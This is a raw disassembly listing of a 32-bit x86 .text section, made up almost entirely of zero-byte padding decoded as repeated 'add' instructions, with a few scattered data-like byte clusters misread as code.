                           .text:00401515 00 00                            add    %al,(%eax)
                           .text:00401517 00 00                            add    %al,(%eax)
                           .text:00401519 00 00                            add    %al,(%eax)
                           .text:0040151b 00 00                            add    %al,(%eax)
                           .text:0040151d 00 00                            add    %al,(%eax)
                           .text:0040151f 00 00                            add    %al,(%eax)
                           .text:00401521 00 00                            add    %al,(%eax)
                           .text:00401523 00 00                            add    %al,(%eax)
                           .text:00401525 00 00                            add    %al,(%eax)
                           .text:00401527 00 00                            add    %al,(%eax)
                           .text:00401529 00 00                            add    %al,(%eax)
                           .text:0040152b 00 00                            add    %al,(%eax)
                           .text:0040152d 00 00                            add    %al,(%eax)
                           .text:0040152f 00 00                            add    %al,(%eax)
                           .text:00401531 00 00                            add    %al,(%eax)
                           .text:00401533 00 00                            add    %al,(%eax)
                           .text:00401535 00 00                            add    %al,(%eax)
                           .text:00401537 00 00                            add    %al,(%eax)
                           .text:00401539 00 00                            add    %al,(%eax)
                           .text:0040153b 00 00                            add    %al,(%eax)
                           .text:0040153d 00 00                            add    %al,(%eax)
                           .text:0040153f 00 00                            add    %al,(%eax)
                           .text:00401541 00 00                            add    %al,(%eax)
                           .text:00401543 00 00                            add    %al,(%eax)
                           .text:00401545 00 00                            add    %al,(%eax)
                           .text:00401547 00 00                            add    %al,(%eax)
                           .text:00401549 00 00                            add    %al,(%eax)
                           .text:0040154b 00 00                            add    %al,(%eax)
                           .text:0040154d 00 00                            add    %al,(%eax)
                           .text:0040154f 00 00                            add    %al,(%eax)
                           .text:00401551 00 00                            add    %al,(%eax)
                           .text:00401553 00 00                            add    %al,(%eax)
                           .text:00401555 00 00                            add    %al,(%eax)
                           .text:00401557 00 00                            add    %al,(%eax)
                           .text:00401559 00 00                            add    %al,(%eax)
                           .text:0040155b 00 00                            add    %al,(%eax)
                           .text:0040155d 00 00                            add    %al,(%eax)
                           .text:0040155f 00 00                            add    %al,(%eax)
                           .text:00401561 00 00                            add    %al,(%eax)
                           .text:00401563 00 00                            add    %al,(%eax)
                           .text:00401565 00 00                            add    %al,(%eax)
                           .text:00401567 00 00                            add    %al,(%eax)
                           .text:00401569 00 00                            add    %al,(%eax)
                           .text:0040156b 00 00                            add    %al,(%eax)
                           .text:0040156d 00 00                            add    %al,(%eax)
                           .text:0040156f 00 00                            add    %al,(%eax)
                           .text:00401571 00 00                            add    %al,(%eax)
                           .text:00401573 00 00                            add    %al,(%eax)
                           .text:00401575 00 00                            add    %al,(%eax)
                           .text:00401577 00 00                            add    %al,(%eax)
                           .text:00401579 00 00                            add    %al,(%eax)
                           .text:0040157b 00 00                            add    %al,(%eax)
                           .text:0040157d 00 00                            add    %al,(%eax)
                           .text:0040157f 00 00                            add    %al,(%eax)
                           .text:00401581 00 00                            add    %al,(%eax)
                           .text:00401583 00 00                            add    %al,(%eax)
                           .text:00401585 00 00                            add    %al,(%eax)
                           .text:00401587 00 00                            add    %al,(%eax)
                           .text:00401589 00 00                            add    %al,(%eax)
                           .text:0040158b 00 00                            add    %al,(%eax)
                           .text:0040158d 00 00                            add    %al,(%eax)
                           .text:0040158f 00 00                            add    %al,(%eax)
                           .text:00401591 00 00                            add    %al,(%eax)
                           .text:00401593 00 00                            add    %al,(%eax)
                           .text:00401595 00 00                            add    %al,(%eax)
                           .text:00401597 00 00                            add    %al,(%eax)
                           .text:00401599 00 00                            add    %al,(%eax)
                           .text:0040159b 00 00                            add    %al,(%eax)
                           .text:0040159d 00 00                            add    %al,(%eax)
                           .text:0040159f 00 00                            add    %al,(%eax)
                           .text:004015a1 00 00                            add    %al,(%eax)
                           .text:004015a3 00 00                            add    %al,(%eax)
                           .text:004015a5 00 00                            add    %al,(%eax)
                           .text:004015a7 00 00                            add    %al,(%eax)
                           .text:004015a9 00 00                            add    %al,(%eax)
                           .text:004015ab 00 00                            add    %al,(%eax)
                           .text:004015ad 00 00                            add    %al,(%eax)
                           .text:004015af 00 00                            add    %al,(%eax)
                           .text:004015b1 00 00                            add    %al,(%eax)
                           .text:004015b3 00 00                            add    %al,(%eax)
                           .text:004015b5 00 00                            add    %al,(%eax)
                           .text:004015b7 00 00                            add    %al,(%eax)
                           .text:004015b9 00 00                            add    %al,(%eax)
                           .text:004015bb 00 00                            add    %al,(%eax)
                           .text:004015bd 00 00                            add    %al,(%eax)
                           .text:004015bf 00 00                            add    %al,(%eax)
                           .text:004015c1 00 00                            add    %al,(%eax)
                           .text:004015c3 00 00                            add    %al,(%eax)
                           .text:004015c5 00 00                            add    %al,(%eax)
                           .text:004015c7 00 00                            add    %al,(%eax)
                           .text:004015c9 00 00                            add    %al,(%eax)
                           .text:004015cb 00 00                            add    %al,(%eax)
                           .text:004015cd 00 00                            add    %al,(%eax)
                           .text:004015cf 00 e0                            add    %ah,%al
                           .text:004015d1 05 00 00 00 00                   add    $0x0,%eax
                           .text:004015d6 00 00                            add    %al,(%eax)
                           .text:004015d8 10 0c 00                         adc    %cl,(%eax,%eax,1)
                           .text:004015db 00 00                            add    %al,(%eax)
                           .text:004015dd 00 00                            add    %al,(%eax)
                           .text:004015df 00 80 82 5d 5a 00                add    %al,0x5a5d82(%eax)
                           .text:004015e5 04 78                            add    $0x78,%al
                           .text:004015e7 22 90 9f 98 b5 bf                and    -0x404a6761(%eax),%dl
                           .text:004015ed 7f 00                            jg     0x004015ef
                           .text:004015ef 00 78 8b                         add    %bh,-0x75(%eax)
                           .text:004015f2 4c                               dec    %esp
                           .text:004015f3 01 00                            add    %eax,(%eax)
                           .text:004015f5 00 00                            add    %al,(%eax)
                           .text:004015f7 00 00                            add    %al,(%eax)
                           .text:004015f9 00 00                            add    %al,(%eax)
                           .text:004015fb 00 00                            add    %al,(%eax)
                           .text:004015fd 00 00                            add    %al,(%eax)
                           .text:004015ff 00 00                            add    %al,(%eax)
                           .text:00401601 00 00                            add    %al,(%eax)
                           .text:00401603 00 00                            add    %al,(%eax)
                           .text:00401605 00 00                            add    %al,(%eax)
                           .text:00401607 00 00                            add    %al,(%eax)
                           .text:00401609 00 00                            add    %al,(%eax)
                           .text:0040160b 00 00                            add    %al,(%eax)
                           .text:0040160d 00 00                            add    %al,(%eax)
                           .text:0040160f 00 00                            add    %al,(%eax)
                           .text:00401611 00 00                            add    %al,(%eax)
                           .text:00401613 00 00                            add    %al,(%eax)
                           .text:00401615 00 00                            add    %al,(%eax)
                           .text:00401617 00 00                            add    %al,(%eax)
                           .text:00401619 00 00                            add    %al,(%eax)
                           .text:0040161b 00 00                            add    %al,(%eax)
                           .text:0040161d 00 00                            add    %al,(%eax)
                           .text:0040161f 00 00                            add    %al,(%eax)
                           .text:00401621 00 00                            add    %al,(%eax)
                           .text:00401623 00 00                            add    %al,(%eax)
                           .text:00401625 00 00                            add    %al,(%eax)
                           .text:00401627 00 00                            add    %al,(%eax)
                           .text:00401629 00 00                            add    %al,(%eax)
                           .text:0040162b 00 00                            add    %al,(%eax)
                           .text:0040162d 00 00                            add    %al,(%eax)
                           .text:0040162f 00 00                            add    %al,(%eax)
                           .text:00401631 00 00                            add    %al,(%eax)
                           .text:00401633 00 00                            add    %al,(%eax)
                           .text:00401635 00 00                            add    %al,(%eax)
                           .text:00401637 00 00                            add    %al,(%eax)
                           .text:00401639 00 00                            add    %al,(%eax)
                           .text:0040163b 00 00                            add    %al,(%eax)
                           .text:0040163d 00 00                            add    %al,(%eax)
                           .text:0040163f 00 00                            add    %al,(%eax)
                           .text:00401641 00 00                            add    %al,(%eax)
                           .text:00401643 00 00                            add    %al,(%eax)
                           .text:00401645 00 00                            add    %al,(%eax)
                           .text:00401647 00 00                            add    %al,(%eax)
                           .text:00401649 00 00                            add    %al,(%eax)
                           .text:0040164b 00 00                            add    %al,(%eax)
                           .text:0040164d 00 00                            add    %al,(%eax)
                           .text:0040164f 00 00                            add    %al,(%eax)
                           .text:00401651 00 00                            add    %al,(%eax)
                           .text:00401653 00 00                            add    %al,(%eax)
                           .text:00401655 00 00                            add    %al,(%eax)
                           .text:00401657 00 00                            add    %al,(%eax)
                           .text:00401659 00 00                            add    %al,(%eax)
                           .text:0040165b 00 00                            add    %al,(%eax)
                           .text:0040165d 00 00                            add    %al,(%eax)
                           .text:0040165f 00 00                            add    %al,(%eax)
                           .text:00401661 00 00                            add    %al,(%eax)
                           .text:00401663 00 00                            add    %al,(%eax)
                           .text:00401665 00 00                            add    %al,(%eax)
                           .text:00401667 00 00                            add    %al,(%eax)
                           .text:00401669 00 00                            add    %al,(%eax)
                           .text:0040166b 00 00                            add    %al,(%eax)
                           .text:0040166d 00 00                            add    %al,(%eax)
                           .text:0040166f 00 00                            add    %al,(%eax)
                           .text:00401671 00 00                            add    %al,(%eax)
                           .text:00401673 00 00                            add    %al,(%eax)
                           .text:00401675 00 00                            add    %al,(%eax)
                           .text:00401677 00 00                            add    %al,(%eax)
                           .text:00401679 00 00                            add    %al,(%eax)
                           .text:0040167b 00 00                            add    %al,(%eax)
                           .text:0040167d 00 00                            add    %al,(%eax)
                           .text:0040167f 00 00                            add    %al,(%eax)
                           .text:00401681 00 00                            add    %al,(%eax)
                           .text:00401683 00 00                            add    %al,(%eax)
                           .text:00401685 00 00                            add    %al,(%eax)
                           .text:00401687 00 00                            add    %al,(%eax)
                           .text:00401689 00 00                            add    %al,(%eax)
                           .text:0040168b 00 00                            add    %al,(%eax)
                           .text:0040168d 00 00                            add    %al,(%eax)
                           .text:0040168f 00 00                            add    %al,(%eax)
                           .text:00401691 00 00                            add    %al,(%eax)
                           .text:00401693 00 00                            add    %al,(%eax)
                           .text:00401695 00 00                            add    %al,(%eax)
                           .text:00401697 00 00                            add    %al,(%eax)
                           .text:00401699 00 00                            add    %al,(%eax)
                           .text:0040169b 00 00                            add    %al,(%eax)
                           .text:0040169d 00 00                            add    %al,(%eax)
                           .text:0040169f 00 00                            add    %al,(%eax)
                           .text:004016a1 00 00                            add    %al,(%eax)
                           .text:004016a3 00 00                            add    %al,(%eax)
                           .text:004016a5 00 00                            add    %al,(%eax)
                           .text:004016a7 00 00                            add    %al,(%eax)
                           .text:004016a9 00 00                            add    %al,(%eax)
                           .text:004016ab 00 00                            add    %al,(%eax)
                           .text:004016ad 00 00                            add    %al,(%eax)
                           .text:004016af 00 00                            add    %al,(%eax)
                           .text:004016b1 00 00                            add    %al,(%eax)
                           .text:004016b3 00 00                            add    %al,(%eax)
                           .text:004016b5 00 00                            add    %al,(%eax)
                           .text:004016b7 00 00                            add    %al,(%eax)
                           .text:004016b9 00 00                            add    %al,(%eax)
                           .text:004016bb 00 00                            add    %al,(%eax)
                           .text:004016bd 00 00                            add    %al,(%eax)
                           .text:004016bf 00 00                            add    %al,(%eax)
                           .text:004016c1 00 00                            add    %al,(%eax)
                           .text:004016c3 00 00                            add    %al,(%eax)
                           .text:004016c5 00 00                            add    %al,(%eax)
                           .text:004016c7 00 00                            add    %al,(%eax)
                           .text:004016c9 00 00                            add    %al,(%eax)
                           .text:004016cb 00 00                            add    %al,(%eax)
                           .text:004016cd 00 00                            add    %al,(%eax)
                           .text:004016cf 00 00                            add    %al,(%eax)
                           .text:004016d1 00 00                            add    %al,(%eax)
                           .text:004016d3 00 00                            add    %al,(%eax)
                           .text:004016d5 00 00                            add    %al,(%eax)
                           .text:004016d7 00 00                            add    %al,(%eax)
                           .text:004016d9 00 00                            add    %al,(%eax)
                           .text:004016db 00 00                            add    %al,(%eax)
                           .text:004016dd 00 00                            add    %al,(%eax)
                           .text:004016df 00 00                            add    %al,(%eax)
                           .text:004016e1 00 00                            add    %al,(%eax)
                           .text:004016e3 00 00                            add    %al,(%eax)
                           .text:004016e5 00 00                            add    %al,(%eax)
                           .text:004016e7 00 00                            add    %al,(%eax)
                           .text:004016e9 00 00                            add    %al,(%eax)
                           .text:004016eb 00 00                            add    %al,(%eax)
                           .text:004016ed 00 00                            add    %al,(%eax)
                           .text:004016ef 00 00                            add    %al,(%eax)
                           .text:004016f1 00 00                            add    %al,(%eax)
                           .text:004016f3 00 00                            add    %al,(%eax)
                           .text:004016f5 00 00                            add    %al,(%eax)
                           .text:004016f7 00 00                            add    %al,(%eax)
                           .text:004016f9 00 00                            add    %al,(%eax)
                           .text:004016fb 00 00                            add    %al,(%eax)
                           .text:004016fd 00 00                            add    %al,(%eax)
                           .text:004016ff 00 00                            add    %al,(%eax)
                           .text:00401701 00 00                            add    %al,(%eax)
                           .text:00401703 00 00                            add    %al,(%eax)
                           .text:00401705 00 00                            add    %al,(%eax)
                           .text:00401707 00 00                            add    %al,(%eax)
                           .text:00401709 00 00                            add    %al,(%eax)
                           .text:0040170b 00 00                            add    %al,(%eax)
                           .text:0040170d 00 00                            add    %al,(%eax)
                           .text:0040170f 00 00                            add    %al,(%eax)
                           .text:00401711 00 00                            add    %al,(%eax)
                           .text:00401713 00 00                            add    %al,(%eax)
                           .text:00401715 00 00                            add    %al,(%eax)
                           .text:00401717 00 00                            add    %al,(%eax)
                           .text:00401719 00 00                            add    %al,(%eax)
                           .text:0040171b 00 00                            add    %al,(%eax)
                           .text:0040171d 00 00                            add    %al,(%eax)
                           .text:0040171f 00 00                            add    %al,(%eax)
                           .text:00401721 00 00                            add    %al,(%eax)
                           .text:00401723 00 00                            add    %al,(%eax)
                           .text:00401725 00 00                            add    %al,(%eax)
                           .text:00401727 00 00                            add    %al,(%eax)
                           .text:00401729 00 00                            add    %al,(%eax)
                           .text:0040172b 00 00                            add    %al,(%eax)
                           .text:0040172d 00 00                            add    %al,(%eax)
                           .text:0040172f 00 00                            add    %al,(%eax)
                           .text:00401731 00 00                            add    %al,(%eax)
                           .text:00401733 00 00                            add    %al,(%eax)
                           .text:00401735 00 00                            add    %al,(%eax)
                           .text:00401737 00 00                            add    %al,(%eax)
                           .text:00401739 00 00                            add    %al,(%eax)
                           .text:0040173b 00 00                            add    %al,(%eax)
                           .text:0040173d 00 00                            add    %al,(%eax)
                           .text:0040173f 00 00                            add    %al,(%eax)
                           .text:00401741 00 00                            add    %al,(%eax)
                           .text:00401743 00 00                            add    %al,(%eax)
                           .text:00401745 00 00                            add    %al,(%eax)
                           .text:00401747 00 00                            add    %al,(%eax)
                           .text:00401749 00 00                            add    %al,(%eax)
                           .text:0040174b 00 00                            add    %al,(%eax)
                           .text:0040174d 00 00                            add    %al,(%eax)
                           .text:0040174f 00 00                            add    %al,(%eax)
                           .text:00401751 00 00                            add    %al,(%eax)
                           .text:00401753 00 00                            add    %al,(%eax)
                           .text:00401755 00 00                            add    %al,(%eax)
                           .text:00401757 00 00                            add    %al,(%eax)
                           .text:00401759 00 00                            add    %al,(%eax)
                           .text:0040175b 00 00                            add    %al,(%eax)
                           .text:0040175d 00 00                            add    %al,(%eax)
                           .text:0040175f 00 00                            add    %al,(%eax)
                           .text:00401761 00 00                            add    %al,(%eax)
                           .text:00401763 00 00                            add    %al,(%eax)
                           .text:00401765 00 00                            add    %al,(%eax)
                           .text:00401767 00 00                            add    %al,(%eax)
                           .text:00401769 00 00                            add    %al,(%eax)
                           .text:0040176b 00 00                            add    %al,(%eax)
                           .text:0040176d 00 00                            add    %al,(%eax)
                           .text:0040176f 00 00                            add    %al,(%eax)
                           .text:00401771 00 00                            add    %al,(%eax)
                           .text:00401773 00 00                            add    %al,(%eax)
                           .text:00401775 00 00                            add    %al,(%eax)
                           .text:00401777 00 00                            add    %al,(%eax)
                           .text:00401779 00 00                            add    %al,(%eax)
                           .text:0040177b 00 00                            add    %al,(%eax)
                           .text:0040177d 00 00                            add    %al,(%eax)
                           .text:0040177f 00 00                            add    %al,(%eax)
                           .text:00401781 00 00                            add    %al,(%eax)
                           .text:00401783 00 00                            add    %al,(%eax)
                           .text:00401785 00 00                            add    %al,(%eax)
                           .text:00401787 00 00                            add    %al,(%eax)
                           .text:00401789 00 00                            add    %al,(%eax)
                           .text:0040178b 00 00                            add    %al,(%eax)
                           .text:0040178d 00 00                            add    %al,(%eax)
                           .text:0040178f 00 00                            add    %al,(%eax)
                           .text:00401791 00 00                            add    %al,(%eax)
                           .text:00401793 00 00                            add    %al,(%eax)
                           .text:00401795 00 00                            add    %al,(%eax)
                           .text:00401797 00 00                            add    %al,(%eax)
                           .text:00401799 00 00                            add    %al,(%eax)
                           .text:0040179b 00 00                            add    %al,(%eax)
                           .text:0040179d 00 00                            add    %al,(%eax)
                           .text:0040179f 00 00                            add    %al,(%eax)
                           .text:004017a1 00 00                            add    %al,(%eax)
                           .text:004017a3 00 00                            add    %al,(%eax)
                           .text:004017a5 00 00                            add    %al,(%eax)
                           .text:004017a7 00 00                            add    %al,(%eax)
                           .text:004017a9 00 00                            add    %al,(%eax)
                           .text:004017ab 00 00                            add    %al,(%eax)
                           .text:004017ad 00 00                            add    %al,(%eax)
                           .text:004017af 00 00                            add    %al,(%eax)
                           .text:004017b1 00 00                            add    %al,(%eax)
                           .text:004017b3 00 00                            add    %al,(%eax)
                           .text:004017b5 00 00                            add    %al,(%eax)
                           .text:004017b7 00 00                            add    %al,(%eax)
                           .text:004017b9 00 00                            add    %al,(%eax)
                           .text:004017bb 00 00                            add    %al,(%eax)
                           .text:004017bd 00 00                            add    %al,(%eax)
                           .text:004017bf 00 00                            add    %al,(%eax)
                           .text:004017c1 00 00                            add    %al,(%eax)
                           .text:004017c3 00 00                            add    %al,(%eax)
                           .text:004017c5 00 00                            add    %al,(%eax)
                           .text:004017c7 00 00                            add    %al,(%eax)
                           .text:004017c9 00 00                            add    %al,(%eax)
                           .text:004017cb 00 00                            add    %al,(%eax)
                           .text:004017cd 00 00                            add    %al,(%eax)
                           .text:004017cf 00 00                            add    %al,(%eax)
                           .text:004017d1 00 00                            add    %al,(%eax)
                           .text:004017d3 00 00                            add    %al,(%eax)
                           .text:004017d5 00 00                            add    %al,(%eax)
                           .text:004017d7 00 00                            add    %al,(%eax)
                           .text:004017d9 00 00                            add    %al,(%eax)
                           .text:004017db 00 00                            add    %al,(%eax)
                           .text:004017dd 00 00                            add    %al,(%eax)
                           .text:004017df 00 00                            add    %al,(%eax)
                           .text:004017e1 00 00                            add    %al,(%eax)
                           .text:004017e3 00 00                            add    %al,(%eax)
                           .text:004017e5 00 00                            add    %al,(%eax)
                           .text:004017e7 00 00                            add    %al,(%eax)
                           .text:004017e9 00 00                            add    %al,(%eax)
                           .text:004017eb 00 00                            add    %al,(%eax)
                           .text:004017ed 00 00                            add    %al,(%eax)
                           .text:004017ef 00 96 d7 fc 92 d6                add    %dl,-0x296d0329(%esi)
                           .text:004017f5 4e                               dec    %esi
                           .text:004017f6 e3 51                            jecxz  0x00401849
                           .text:004017f8 70 98                            jo     0x00401792
                           .text:004017fa 98                               cwtl   
                           .text:004017fb b5 bf                            mov    $0xbf,%ch
                           .text:004017fd 7f 00                            jg     0x004017ff
                           .text:004017ff 00 b0 32 c7 b9 bf                add    %dh,-0x404638ce(%eax)
                           .text:00401805 7f 00                            jg     0x00401807
                           .text:00401807 00 00                            add    %al,(%eax)
                           .text:00401809 00 00                            add    %al,(%eax)
                           .text:0040180b 00 00                            add    %al,(%eax)
                           .text:0040180d 00 00                            add    %al,(%eax)
                           .text:0040180f 00 00                            add    %al,(%eax)
                           .text:00401811 00 00                            add    %al,(%eax)
                           .text:00401813 00 00                            add    %al,(%eax)
                           .text:00401815 00 00                            add    %al,(%eax)
                           .text:00401817 00 00                            add    %al,(%eax)
                           .text:00401819 00 00                            add    %al,(%eax)
                           .text:0040181b 00 00                            add    %al,(%eax)
                           .text:0040181d 00 00                            add    %al,(%eax)
                           .text:0040181f 00 00                            add    %al,(%eax)
                           .text:00401821 00 00                            add    %al,(%eax)
                           .text:00401823 00 00                            add    %al,(%eax)
                           .text:00401825 00 00                            add    %al,(%eax)
                           .text:00401827 00 00                            add    %al,(%eax)
                           .text:00401829 00 00                            add    %al,(%eax)
                           .text:0040182b 00 00                            add    %al,(%eax)
                           .text:0040182d 00 00                            add    %al,(%eax)
                           .text:0040182f 00 00                            add    %al,(%eax)
                           .text:00401831 00 00                            add    %al,(%eax)
                           .text:00401833 00 00                            add    %al,(%eax)
                           .text:00401835 00 00                            add    %al,(%eax)
                           .text:00401837 00 00                            add    %al,(%eax)
                           .text:00401839 00 00                            add    %al,(%eax)
                           .text:0040183b 00 00                            add    %al,(%eax)
                           .text:0040183d 00 00                            add    %al,(%eax)
                           .text:0040183f 00 00                            add    %al,(%eax)
                           .text:00401841 00 00                            add    %al,(%eax)
                           .text:00401843 00 00                            add    %al,(%eax)
                           .text:00401845 00 00                            add    %al,(%eax)
                           .text:00401847 00 00                            add    %al,(%eax)
                           .text:00401849 00 00                            add    %al,(%eax)
                           .text:0040184b 00 00                            add    %al,(%eax)
                           .text:0040184d 00 00                            add    %al,(%eax)
                           .text:0040184f 00 9a 8b 14 e5 8e                add    %bl,-0x711aeb75(%edx)
                           .text:00401855 e6 27                            out    %al,$0x27
                           .text:00401857 27                               daa    
                           .text:00401858 40                               inc    %eax
                           .text:00401859 98                               cwtl   
                           .text:0040185a 98                               cwtl   
                           .text:0040185b b5 bf                            mov    $0xbf,%ch
                           .text:0040185d 7f 00                            jg     0x0040185f
                           .text:0040185f 00 80 58 70 00 00                add    %al,0x7058(%eax)
                           .text:00401865 00 00                            add    %al,(%eax)
                           .text:00401867 00 00                            add    %al,(%eax)
                           .text:00401869 00 00                            add    %al,(%eax)
                           .text:0040186b 00 00                            add    %al,(%eax)
                           .text:0040186d 00 00                            add    %al,(%eax)
                           .text:0040186f 00 00                            add    %al,(%eax)
                           .text:00401871 00 00                            add    %al,(%eax)
                           .text:00401873 00 00                            add    %al,(%eax)
                           .text:00401875 00 00                            add    %al,(%eax)
                           .text:00401877 00 00                            add    %al,(%eax)
                           .text:00401879 00 00                            add    %al,(%eax)
                           .text:0040187b 00 00                            add    %al,(%eax)
                           .text:0040187d 00 00                            add    %al,(%eax)
                           .text:0040187f 00 00                            add    %al,(%eax)
                           .text:00401881 00 00                            add    %al,(%eax)
                           .text:00401883 00 00                            add    %al,(%eax)
                           .text:00401885 00 00                            add    %al,(%eax)
                           .text:00401887 00 00                            add    %al,(%eax)
                           .text:00401889 00 00                            add    %al,(%eax)
                           .text:0040188b 00 00                            add    %al,(%eax)
                           .text:0040188d 00 00                            add    %al,(%eax)
                           .text:0040188f 00 00                            add    %al,(%eax)
                           .text:00401891 00 00                            add    %al,(%eax)
                           .text:00401893 00 00                            add    %al,(%eax)
                           .text:00401895 00 00                            add    %al,(%eax)
                           .text:00401897 00 00                            add    %al,(%eax)
                           .text:00401899 00 00                            add    %al,(%eax)
                           .text:0040189b 00 00                            add    %al,(%eax)
                           .text:0040189d 00 00                            add    %al,(%eax)
                           .text:0040189f 00 00                            add    %al,(%eax)
                           .text:004018a1 00 00                            add    %al,(%eax)
                           .text:004018a3 00 00                            add    %al,(%eax)
                           .text:004018a5 00 00                            add    %al,(%eax)
                           .text:004018a7 00 00                            add    %al,(%eax)
                           .text:004018a9 00 00                            add    %al,(%eax)
                           .text:004018ab 00 00                            add    %al,(%eax)
                           .text:004018ad 00 00                            add    %al,(%eax)
                           .text:004018af 00 00                            add    %al,(%eax)
                           .text:004018b1 00 00                            add    %al,(%eax)
                           .text:004018b3 00 00                            add    %al,(%eax)
                           .text:004018b5 00 00                            add    %al,(%eax)
                           .text:004018b7 00 00                            add    %al,(%eax)
                           .text:004018b9 00 00                            add    %al,(%eax)
                           .text:004018bb 00 00                            add    %al,(%eax)
                           .text:004018bd 00 00                            add    %al,(%eax)
                           .text:004018bf 00 00                            add    %al,(%eax)
                           .text:004018c1 00 00                            add    %al,(%eax)
                           .text:004018c3 00 00                            add    %al,(%eax)
                           .text:004018c5 00 00                            add    %al,(%eax)
                           .text:004018c7 00 1f                            add    %bl,(%edi)
                           .text:004018c9 ab                               stos   %eax,%es:(%edi)
                           .text:004018ca 7e 37                            jle    0x00401903
                           .text:004018cc 96                               xchg   %eax,%esi
                           .text:004018cd a4                               movsb  %ds:(%esi),%es:(%edi)
                           .text:004018ce 75 e6                            jne    0x004018b6
                           .text:004018d0 f0 90                            lock nop
                           .text:004018d2 98                               cwtl   
                           .text:004018d3 b5 bf                            mov    $0xbf,%ch
                           .text:004018d5 7f 00                            jg     0x004018d7
                           .text:004018d7 00 60 8b                         add    %ah,-0x75(%eax)
                           .text:004018da 4c                               dec    %esp
                           .text:004018db 01 00                            add    %eax,(%eax)
                           .text:004018dd 00 00                            add    %al,(%eax)
                           .text:004018df 00 a0 b8 0e ff 21                add    %ah,0x21ff0eb8(%eax)
                           .text:004018e5 98                               cwtl   
                           .text:004018e6 96                               xchg   %eax,%esi
                           .text:004018e7 6c                               insb   (%dx),%es:(%edi)
                           .text:004018e8 b0 9a                            mov    $0x9a,%al
                           .text:004018ea 98                               cwtl   
                           .text:004018eb b5 bf                            mov    $0xbf,%ch
                           .text:004018ed 7f 00                            jg     0x004018ef
                           .text:004018ef 00 90 8b 4c 01 00                add    %dl,0x14c8b(%eax)
                           .text:004018f5 00 00                            add    %al,(%eax)
                           .text:004018f7 00 00                            add    %al,(%eax)
                           .text:004018f9 00 00                            add    %al,(%eax)
                           .text:004018fb 00 00                            add    %al,(%eax)
                           .text:004018fd 00 00                            add    %al,(%eax)
                           .text:004018ff 00 00                            add    %al,(%eax)
                           .text:00401901 00 00                            add    %al,(%eax)
                           .text:00401903 00 00                            add    %al,(%eax)
                           .text:00401905 00 00                            add    %al,(%eax)
                           .text:00401907 00 00                            add    %al,(%eax)
                           .text:00401909 00 00                            add    %al,(%eax)
                           .text:0040190b 00 00                            add    %al,(%eax)
                           .text:0040190d 00 00                            add    %al,(%eax)
                           .text:0040190f 00 22                            add    %ah,(%edx)
                           .text:00401911 a8 8d                            test   $0x8d,%al
                           .text:00401913 4a                               dec    %edx
                           .text:00401914 50                               push   %eax
                           .text:00401915 9f                               lahf   
                           .text:00401916 cd 02                            int    $0x2
                           .text:00401918 e0 94                            loopne 0x004018ae
                           .text:0040191a 98                               cwtl   
                           .text:0040191b b5 bf                            mov    $0xbf,%ch
                           .text:0040191d 7f 00                            jg     0x0040191f
                           .text:0040191f 00 08                            add    %cl,(%eax)
                           .text:00401921 55                               push   %ebp
                           .text:00401922 6d                               insl   (%dx),%es:(%edi)
                           .text:00401923 c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401929 00 00                            add    %al,(%eax)
                           .text:0040192b 00 00                            add    %al,(%eax)
                           .text:0040192d 00 00                            add    %al,(%eax)
                           .text:0040192f 00 00                            add    %al,(%eax)
                           .text:00401931 00 00                            add    %al,(%eax)
                           .text:00401933 00 00                            add    %al,(%eax)
                           .text:00401935 00 00                            add    %al,(%eax)
                           .text:00401937 00 00                            add    %al,(%eax)
                           .text:00401939 00 00                            add    %al,(%eax)
                           .text:0040193b 00 00                            add    %al,(%eax)
                           .text:0040193d 00 00                            add    %al,(%eax)
                           .text:0040193f 00 00                            add    %al,(%eax)
                           .text:00401941 00 00                            add    %al,(%eax)
                           .text:00401943 00 00                            add    %al,(%eax)
                           .text:00401945 00 00                            add    %al,(%eax)
                           .text:00401947 00 00                            add    %al,(%eax)
                           .text:00401949 00 00                            add    %al,(%eax)
                           .text:0040194b 00 00                            add    %al,(%eax)
                           .text:0040194d 00 00                            add    %al,(%eax)
                           .text:0040194f 00 00                            add    %al,(%eax)
                           .text:00401951 00 00                            add    %al,(%eax)
                           .text:00401953 00 00                            add    %al,(%eax)
                           .text:00401955 00 00                            add    %al,(%eax)
                           .text:00401957 00 00                            add    %al,(%eax)
                           .text:00401959 00 00                            add    %al,(%eax)
                           .text:0040195b 00 00                            add    %al,(%eax)
                           .text:0040195d 00 00                            add    %al,(%eax)
                           .text:0040195f 00 00                            add    %al,(%eax)
                           .text:00401961 00 00                            add    %al,(%eax)
                           .text:00401963 00 00                            add    %al,(%eax)
                           .text:00401965 00 00                            add    %al,(%eax)
                           .text:00401967 00 00                            add    %al,(%eax)
                           .text:00401969 00 00                            add    %al,(%eax)
                           .text:0040196b 00 00                            add    %al,(%eax)
                           .text:0040196d 00 00                            add    %al,(%eax)
                           .text:0040196f 00 00                            add    %al,(%eax)
                           .text:00401971 00 00                            add    %al,(%eax)
                           .text:00401973 00 00                            add    %al,(%eax)
                           .text:00401975 00 00                            add    %al,(%eax)
                           .text:00401977 00 00                            add    %al,(%eax)
                           .text:00401979 00 00                            add    %al,(%eax)
                           .text:0040197b 00 00                            add    %al,(%eax)
                           .text:0040197d 00 00                            add    %al,(%eax)
                           .text:0040197f 00 00                            add    %al,(%eax)
                           .text:00401981 00 00                            add    %al,(%eax)
                           .text:00401983 00 00                            add    %al,(%eax)
                           .text:00401985 00 00                            add    %al,(%eax)
                           .text:00401987 00 00                            add    %al,(%eax)
                           .text:00401989 00 00                            add    %al,(%eax)
                           .text:0040198b 00 00                            add    %al,(%eax)
                           .text:0040198d 00 00                            add    %al,(%eax)
                           .text:0040198f 00 00                            add    %al,(%eax)
                           .text:00401991 00 00                            add    %al,(%eax)
                           .text:00401993 00 00                            add    %al,(%eax)
                           .text:00401995 00 00                            add    %al,(%eax)
                           .text:00401997 00 00                            add    %al,(%eax)
                           .text:00401999 00 00                            add    %al,(%eax)
                           .text:0040199b 00 00                            add    %al,(%eax)
                           .text:0040199d 00 00                            add    %al,(%eax)
                           .text:0040199f 00 00                            add    %al,(%eax)
                           .text:004019a1 00 00                            add    %al,(%eax)
                           .text:004019a3 00 00                            add    %al,(%eax)
                           .text:004019a5 00 00                            add    %al,(%eax)
                           .text:004019a7 00 00                            add    %al,(%eax)
                           .text:004019a9 00 00                            add    %al,(%eax)
                           .text:004019ab 00 00                            add    %al,(%eax)
                           .text:004019ad 00 00                            add    %al,(%eax)
                           .text:004019af 00 00                            add    %al,(%eax)
                           .text:004019b1 00 00                            add    %al,(%eax)
                           .text:004019b3 00 00                            add    %al,(%eax)
